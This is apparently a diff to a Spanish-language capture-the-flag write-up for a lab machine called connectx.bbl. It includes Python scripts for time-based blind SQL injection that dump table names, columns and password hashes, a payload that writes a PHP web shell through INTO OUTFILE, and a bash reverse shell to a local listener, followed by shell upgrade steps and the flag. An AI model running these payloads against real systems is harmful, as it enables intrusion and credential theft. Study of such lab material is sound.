@@ -307,3 +307,415 @@ Probando: connectxZ
 ```
 
 Vemos que nos saca el nombre de la base de datos llamada `connectx`, por lo que ahora tendremos que saber las tablas que tiene dicha base de datos.&#x20;
+
+Vamos a modificar el script un poco de la siguiente forma:
+
+> tableName.py
+
+```python
+import requests
+import string
+import time
+from pwn import log
+from termcolor import cprint
+from colorama import init
+
+# Inicializar colorama
+init(autoreset=True)
+
+# Configuración de la URL y encabezados
+URL = "http://connectx.bbl/home.php"
+HEADERS = {
+    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
+    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8",
+    "Accept-Language": "en-US,en;q=0.5",
+    "Accept-Encoding": "gzip, deflate, br",
+    "Origin": "http://connectx.bbl",
+    "Connection": "keep-alive",
+    "Referer": "http://connectx.bbl/home.php",
+    "Upgrade-Insecure-Requests": "1",
+    "Content-Type": "application/x-www-form-urlencoded",
+    "Cookie": "PHPSESSID=<COOKIE>"
+}
+
+# Caracteres a probar (mayúsculas y minúsculas)
+CHARSET = string.ascii_letters  # abc...xyzABC...XYZ
+
+def animar_letras(base, char_actual, longitud):
+    """
+    Función para mostrar la animación de letras probadas en tiempo real.
+    Se actualiza cada vez que se prueba una nueva letra.
+    """
+    animacion = base + char_actual + "_" * (longitud - len(base) - 1)
+    cprint(f"Probando: {animacion}", 'yellow', end='\r')
+    time.sleep(0.05)  # Pequeña pausa para la animación
+
+def inferir_tablas():
+    tablas = []
+    tabla_index = 0
+    p = log.progress("Descubriendo nombres de tablas")
+
+    while True:
+        nombre_tabla = ""
+        char_index = 1
+        encontrada_tabla = False
+
+        while True:
+            encontrada_letra = False
+            for char in CHARSET:
+                animar_letras(nombre_tabla, char, char_index)
+
+                payload = f"username=admin'+or+if(ascii(substr((select+table_name+from+information_schema.tables+where+table_schema='connectx'+limit+{tabla_index},1),{char_index},1))={ord(char)},sleep(5),0)--+-"
+                inicio = time.time()
+                requests.post(URL, headers=HEADERS, data=payload)
+                tiempo_respuesta = time.time() - inicio
+
+                if tiempo_respuesta >= 5:
+                    nombre_tabla += char
+                    p.status(f"[{tabla_index}] {nombre_tabla}")
+                    encontrada_letra = True
+                    encontrada_tabla = True
+                    break
+
+            if not encontrada_letra:
+                break  # Terminó el nombre de esta tabla
+
+            char_index += 1
+
+        if not encontrada_tabla:
+            break  # No encontró ninguna letra para esta tabla. Fin.
+
+        tablas.append(nombre_tabla)
+        tabla_index += 1
+
+    p.success("Descubrimiento de tablas completado")
+    mostrar_tablas_resultado(tablas)
+    return tablas
+
+def mostrar_tablas_resultado(tablas):
+    """
+    Muestra una tabla con todos los nombres de tablas descubiertos.
+    """
+    cprint("\n+------------------------+", 'cyan')
+    cprint("|   Tablas descubiertas  |", 'cyan')
+    cprint("+------------------------+", 'cyan')
+    for t in tablas:
+        cprint(f"| {t:<22} |", 'cyan')
+    cprint("+------------------------+", 'cyan')
+
+if __name__ == "__main__":
+    inferir_tablas()
+```
+
+Y lo ejecutaremos de la siguiente forma:
+
+```shell
+python3 databaseName.py
+```
+
+Info:
+
+```
+[+] Descubriendo nombres de tablas: Descubrimiento de tablas completado
+Probando: ZsersZ
++------------------------+                                                     
+|   Tablas descubiertas  |
++------------------------+
+| posts                  |
+| users                  |
++------------------------+
+```
+
+Vemos que tenemos dos tablas, entre ellas la que mas nos interesa es la informacion de la tabla `users`, por lo que modificaremos un poco el script tambien para poder sacar dicha informacion.
+
+> columnsName.py
+
+```python
+import requests
+import string
+import time
+from pwn import log
+from termcolor import cprint
+from colorama import init
+
+# Inicializar colorama
+init(autoreset=True)
+
+URL = "http://connectx.bbl/home.php"
+HEADERS = {
+    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
+    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8",
+    "Accept-Language": "en-US,en;q=0.5",
+    "Accept-Encoding": "gzip, deflate, br",
+    "Origin": "http://connectx.bbl",
+    "Connection": "keep-alive",
+    "Referer": "http://connectx.bbl/home.php",
+    "Upgrade-Insecure-Requests": "1",
+    "Content-Type": "application/x-www-form-urlencoded",
+    "Cookie": "PHPSESSID=<COOKIE>"
+}
+
+# Ampliar el conjunto de caracteres
+CHARSET = string.ascii_letters + string.digits + "_@.-{}[]!#$%&*()+=^~<>?/|\\"
+
+def animar_letras(base, char_actual, longitud):
+    animacion = base + char_actual + "_" * (longitud - len(base) - 1)
+    cprint(f"Probando: {animacion}", 'yellow', end='\r')
+    time.sleep(0.05)
+
+def inferir_columnas(tabla):
+    columnas = []
+    index_col = 0
+    p = log.progress("Descubriendo columnas")
+
+    while True:
+        col_name = ""
+        char_index = 1
+        encontrado = False
+
+        while True:
+            letra_encontrada = False
+            for char in CHARSET:
+                animar_letras(col_name, char, char_index)
+                payload = f"username=admin'+or+if(ascii(substr((select+column_name+from+information_schema.columns+where+table_name='{tabla}'+limit+{index_col},1),{char_index},1))={ord(char)},sleep(3),0)--+-"
+                inicio = time.time()
+                requests.post(URL, headers=HEADERS, data=payload)
+                if time.time() - inicio >= 5:
+                    col_name += char
+                    p.status(f"[{index_col}] {col_name}")
+                    letra_encontrada = True
+                    encontrado = True
+                    break
+            if not letra_encontrada:
+                break
+            char_index += 1
+
+        if not encontrado:
+            break
+        columnas.append(col_name)
+        index_col += 1
+
+    p.success("Columnas encontradas")
+    cprint(f"Columnas: {', '.join(columnas)}", 'cyan')
+    return columnas
+
+def inferir_valores(tabla, columnas):
+    datos = []
+    fila_index = 0
+    p = log.progress("Extrayendo datos")
+
+    while True:
+        fila = {}
+        any_data = False
+        for columna in columnas:
+            valor = ""
+            char_index = 1
+
+            # Detectamos si la columna podría ser una contraseña
+            if 'password' in columna.lower():
+                longitud_max = 50  # Establecemos una longitud máxima para la contraseña (ajustar según sea necesario)
+            else:
+                longitud_max = 10  # Para otras columnas limitamos la longitud a 10 caracteres (ajustar según sea necesario)
+
+            while True:
+                letra_encontrada = False
+                for char in CHARSET:
+                    animar_letras(valor, char, char_index)
+                    payload = f"username=admin'+or+if(ascii(substr((select+{columna}+from+{tabla}+limit+{fila_index},1),{char_index},1))={ord(char)},sleep(5),0)--+-"
+                    inicio = time.time()
+                    requests.post(URL, headers=HEADERS, data=payload)
+                    if time.time() - inicio >= 5:
+                        valor += char
+                        letra_encontrada = True
+                        any_data = True
+                        break
+                if not letra_encontrada:
+                    break
+                char_index += 1
+                if len(valor) >= longitud_max:
+                    break
+            fila[columna] = valor
+            p.status(f"[Fila {fila_index}] {columna}: {valor}")
+
+        if not any_data:
+            break
+        datos.append(fila)
+        fila_index += 1
+
+    p.success("Datos extraídos")
+    mostrar_datos(tabla, columnas, datos)
+
+def mostrar_datos(tabla, columnas, datos):
+    cprint(f"\n+{'-' * 60}+", 'cyan')
+    cprint(f"| Datos extraídos de la tabla '{tabla}'", 'cyan')
+    cprint(f"+{'-' * 60}+", 'cyan')
+    cprint(" | ".join([f"{col:<15}" for col in columnas]), 'cyan')
+    cprint("-" * (17 * len(columnas)), 'cyan')
+    for fila in datos:
+        cprint(" | ".join([f"{fila[col]:<15}" for col in columnas]), 'cyan')
+    cprint(f"+{'-' * 60}+", 'cyan')
+
+if __name__ == "__main__":
+    tabla = "users"
+    columnas = inferir_columnas(tabla)
+    inferir_valores(tabla, columnas)
+```
+
+Ahora lo ejecutaremos de la siguiente forma:
+
+```shell
+python3 columnsName.py
+```
+
+Info:
+
+```
+[+] Descubriendo columnas: Columnas encontradas
+Columnas: id, username, password, path
+[+] Extrayendo datos: Datos extraídos
+Probando: }ploads}
++------------------------------------------------------------+                    
+| Datos extraídos de la tabla 'users'
++------------------------------------------------------------+
+id              | username        | password        | path           
+--------------------------------------------------------------------
+1               | admin           | $2y$10$Nrvrm6mUYTTLEJdMOWipBe8MD3931kWGCt/K0dRPu8EkhohdURe4m                | uploads        
+3               | diseo           | $2y$10$01t/7.AjDz672ds9ymTZbuRdRfgYRbx26kU2ZNta8j2                | uploads        
+2               | kike            | $2y$10$01t/7.AjDz672ds9ymTZbuRdRfgYRbx26kU2ZNta8j2Agm/TfZaQS                | uploads        
++------------------------------------------------------------+
+```
+
+Vemos que nos saco las credenciales de forma correcta, pero si intentamos `crackearlo` no podremos por lo que no nos sirve de mucho, vamos a comprobar si se pudiera ejecutar codigo de forma remota mediante un `SQL Injection`, a esto se le llamaria `SQL Injection -> RCE`.
+
+Si por ejemplo probamos a poner varios `payloads` de los pocos que me funciono fue el siguiente para escribir `test` en un fichero.
+
+```
+username=admin'+UNION+SELECT+'test'+INTO+OUTFILE+'/var/www/connectx.bbl/text.txt'--+-
+```
+
+Quedando de esta forma la peticion:
+
+```
+POST /home.php HTTP/1.1
+Host: connectx.bbl
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 85
+Origin: http://connectx.bbl
+Connection: keep-alive
+Referer: http://connectx.bbl/home.php
+Cookie: PHPSESSID=ko1jjbi02plfk9dl2ft3oseh8u
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+
+username=admin'+UNION+SELECT+'test'+INTO+OUTFILE+'/var/www/connectx.bbl/text.txt'--+-
+```
+
+Si lo enviamos en la respuesta del servidor nos dara un `500 error` pero si nos vamos a la `URL` donde deberia de estar el archivo, veremos que funciono:
+
+```
+URL = http://connectx.bbl/text.txt
+```
+
+<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+Ahora vamos hacer esto mismo, pero para subir un archivo en `PHP` y poder ejecutar codigo de forma remota mediante ese codigo en `PHP`.
+
+```
+username=admin'+union+select+'<?php+system($_GET[0]);+?>'+into+outfile+'/var/www/connectx.bbl/command.php'--+-
+```
+
+#### **Explicación:**
+
+* **`'+union+select+'`**: Cierra la consulta original y comienza la inyección con `UNION SELECT`.
+* **`'<?php+system($_GET[0]);+?>'`**: El código PHP a escribir en el archivo. Usa `system()` para ejecutar el comando recibido en la URL como `command=...`.
+* **`into+outfile+'/var/www/connectx.bbl/command.php'`**: Especifica la ruta en la que el archivo PHP será escrito (`/var/www/connectx.bbl/command.php`).
+* **`--+-`**: Comentario SQL para que no afecte al resto de la consulta.
+
+Tendremos que tener esta peticion:
+
+```
+POST /home.php HTTP/1.1
+Host: connectx.bbl
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 236
+Origin: http://connectx.bbl
+Connection: keep-alive
+Referer: http://connectx.bbl/home.php
+Cookie: PHPSESSID=ko1jjbi02plfk9dl2ft3oseh8u
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+
+username=admin'+union+select+'<?php+system($_GET[0]);+?>'+into+outfile+'/var/www/connectx.bbl/command.php'--+-
+```
+
+Y si nos vamos a la sigueinte `URL`:
+
+```
+URL = http://connectx.bbl/command.php?0=whoami
+```
+
+Veremos que funciona:
+
+<figure><img src="../../.gitbook/assets/image (326).png" alt=""><figcaption></figcaption></figure>
+
+Ahora lo que haremos sera realizar una `reverse shell` de la siguiente forma:
+
+```
+command.php?0=bash -c "bash -i >%26 /dev/tcp/192.168.1.146/7777 0>%261"
+```
+
+Antes de enviarlo nos pondremos a la escucha:
+
+```shell
+nc -lvnp <PORT>
+```
+
+Si enviamos ese `payload` y volvemos a donde tenemos la escucha veremos lo siguiente:
+
+```
+listening on [any] 7777 ...
+connect to [192.168.1.146] from (UNKNOWN) [192.168.1.151] 34364
+bash: cannot set terminal process group (508): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@debian:/var/www/connectx.bbl$ whoami
+whoami
+www-data
+```
+
+Vemos que ha funcionado por lo que tendremos que sanitizar la `shell` (TTY).
+
+### Sanitización de shell (TTY)
+
+```shell
+script /dev/null -c bash
+```
+
+```shell
+# <Ctrl> + <z>
+stty raw -echo; fg
+reset xterm
+export TERM=xterm
+export SHELL=/bin/bash
+
+# Para ver las dimensiones de nuestra consola en el Host
+stty size
+
+# Para redimensionar la consola ajustando los parametros adecuados
+stty rows <ROWS> columns <COLUMNS>
+```
+
+Por lo que vemos con esto ya habremos terminado la maquina y habremos aprovechado de forma correcta la vulnerabilidad, ahora leeremos la `flag`.
+
+> flag.txt
+
+```
+bf5d5347e5f42004a51af934ccb9cf29
+```
